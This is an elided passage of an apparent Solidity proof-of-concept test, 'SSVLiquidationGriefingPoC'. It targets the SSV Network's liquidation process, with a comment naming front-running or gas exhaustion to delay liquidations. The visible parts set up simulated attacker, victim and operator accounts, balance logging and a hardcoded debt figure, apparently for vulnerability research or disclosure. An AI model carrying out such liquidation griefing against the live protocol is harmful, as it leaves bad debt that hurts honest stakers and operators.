 ...
 *      2. Grief liquidators to delay liquidation (front-running or gas exhaustion)
...
contract SSVLiquidationGriefingPoC is PoC {
    ...
    // keccak256("ssv.network.storage.main") - 1
    ...
    function initiateAttack() external {
        ...
        setAlias(address(this), "Attacker/Liquidator");
        setAlias(VICTIM_LARGE, "Victim Large (Honest)");
        setAlias(VICTIM_SMALL_1, "Victim Small 1 (Bankrupt)");
        setAlias(VICTIM_SMALL_2, "Victim Small 2 (Bankrupt)");
        setAlias(VICTIM_SMALL_3, "Victim Small 3 (Bankrupt)");
        setAlias(OPERATOR_1, "Operator 1");
        setAlias(OPERATOR_2, "Operator 2");
        setAlias(OPERATOR_3, "Operator 3");
        setAlias(DAO, "DAO Treasury");
        setAlias(LIQUIDATOR, "Liquidator");
    ...
    function _executeAttack() internal override {
        ...
        snapshotAndPrint(VICTIM_LARGE, tokens);
        snapshotAndPrint(VICTIM_SMALL_1, tokens);
        snapshotAndPrint(VICTIM_SMALL_2, tokens);
        snapshotAndPrint(VICTIM_SMALL_3, tokens);
        ...
        console.log("Victim Large deposited:  ", LARGE_DEPOSIT / 1e18, "SSV");
        ...
        _setupOperatorState(1, OPERATOR_1, OPERATOR_FEE, 100);
        _setupOperatorState(2, OPERATOR_2, OPERATOR_FEE, 100);
        _setupOperatorState(3, OPERATOR_3, OPERATOR_FEE, 100);
        ...
        // Total virtual debt: ~485 SSV (plus DAO network fees)
        
        totalVirtualDebt = 485e18;
    ...
    function _simulateOperatorWithdrawal(address operator, uint256 amount) internal returns (uint256) {
        ...
        // Simulate withdrawal from SSV Network
